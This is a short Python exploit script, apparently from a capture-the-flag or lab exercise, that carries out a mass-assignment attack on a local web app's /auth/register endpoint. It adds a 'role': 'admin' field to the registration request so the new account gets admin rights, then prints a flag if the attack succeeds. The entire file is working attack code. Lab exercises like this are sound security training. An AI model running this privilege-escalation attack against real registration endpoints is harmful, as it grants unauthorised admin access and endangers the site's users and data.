import requests
import json
from colorama import Fore, Style, init

init()

BASE_URL = "http://localhost:3000"


def exploit_mass_assignment():
    print(
        f"{Fore.YELLOW}[*] Attempting mass assigment attack: {Style.RESET_ALL}")

    payload = {
        "username": "arioolnnn",
        "password": "password123",
        "email": "arioolnn@exapmle.com",
        "role": "admin",
        "ssn": "000-00-000"
    }

    response = requests.post(
        f"{BASE_URL}/auth/register",
        json=payload,
        headers={"Content-Type": "application/json"}
    )

    data = response.json()
    print(f"{Fore.GREEN}[+] Response:{Style.RESET_ALL}")
    print(json.dumps(data, indent=2))

    if data.get("user", {}).get("role") == "admin":
        print(
            f"{Fore.GREEN}[+] SUCCESS, REGISTERED AS ADMIN {Style.RESET_ALL}")
        if "flag" in data:
            print(f"{Fore.CYAN}[FLAG] {data['flag']}{Style.RESET_ALL}")

    return data


if __name__ == "__main__":
    exploit_mass_assignment()
